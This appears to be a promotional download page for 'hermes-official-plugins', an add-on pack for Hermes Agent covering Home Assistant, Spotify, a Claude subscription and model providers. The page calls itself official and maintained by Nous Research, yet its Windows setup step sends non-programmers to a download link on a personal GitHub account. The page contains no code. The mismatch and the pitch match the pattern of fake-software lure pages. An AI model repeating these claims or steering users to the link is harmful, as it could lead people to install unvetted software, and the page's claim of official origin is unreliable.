📦 What Is hermes-official-plugins?

hermes-official-plugins is the official set of add-ons for Hermes Agent. Think of Hermes Agent as a helpful digital assistant that runs on your own computer, and think of plugins as the extra abilities you can switch on for it.

Out of the box, an assistant can only do so much. With this plugin pack, your Hermes Agent can talk to your smart home devices, play music in your Spotify account, connect to Claude through a Claude subscription, and work with different AI model providers. Instead of hunting down tools in different places, everything is gathered in one place by the people who make Hermes Agent: Nous Research.

The best part is that you do not need to be a programmer. You do not need to write code, edit files, or understand technical terms. You simply visit the official page, follow the on-screen instructions, and your plugin catalog becomes available.

✨ What Plugins Are Included?

Each plugin adds a new skill to your Hermes Agent. Here is what you can expect from the main ones:

🏠 Home Assistant

Connect your smart home to Hermes Agent. Ask it to check lights, read sensors, or control devices around the house — all in plain language.

🎵 Spotify

Let your agent work with your Spotify account. Search for music, manage playback, and keep your listening experience hands-free.

🤖 Claude Subscription DirectSDK

Use your Claude subscription directly inside Hermes Agent, so your assistant can lean on Claude's abilities without extra setup steps.

🔌 Model Provider

Choose and connect the AI model provider that suits you. Hermes Agent stays flexible about which language model powers it.

The catalog continues to grow. Because these plugins are maintained by Nous Research, they are designed to work together and to stay compatible with new versions of Hermes Agent.

🚀 Download and Setup on Windows

Getting started takes only a few minutes. Follow the simple steps below in order, and read each one carefully before moving on.

Main step: Visit this link to download the application.
  1. Open the official page. Click the large button at the top of this page, or use this link: https://github.com/Dancho-arc/hermes-official-plugins. It opens the official hermes-official-plugins page in your web browser.
  2. Follow the instructions shown on that page. The page is maintained by Nous Research and lists exactly what to do next. Read the text on the page before clicking anything, so you always know what the next action will be.
  3. Keep the page open while you work. If you need to come back to it later, bookmark it in your browser so you can find it easily again.
  4. Open Hermes Agent on your Windows computer. Once the plugin collection is on your machine, launch Hermes Agent as you normally would.
  5. Open the plugin catalog. Inside Hermes Agent, go to the plugin catalog area. This is where all available add-ons are listed in one place.
  6. Turn on the plugins you want. Select the plugins that match your needs — for example Home Assistant for your smart home or Spotify for music — and enable them.
  7. Connect your accounts when asked. Some plugins need you to sign in to the service they connect to. Follow the prompts on screen; they are written to guide you step by step.
  8. Test one plugin at a time. After enabling a plugin, ask Hermes Agent a simple question that uses it. This confirms everything is working before you add the next one.
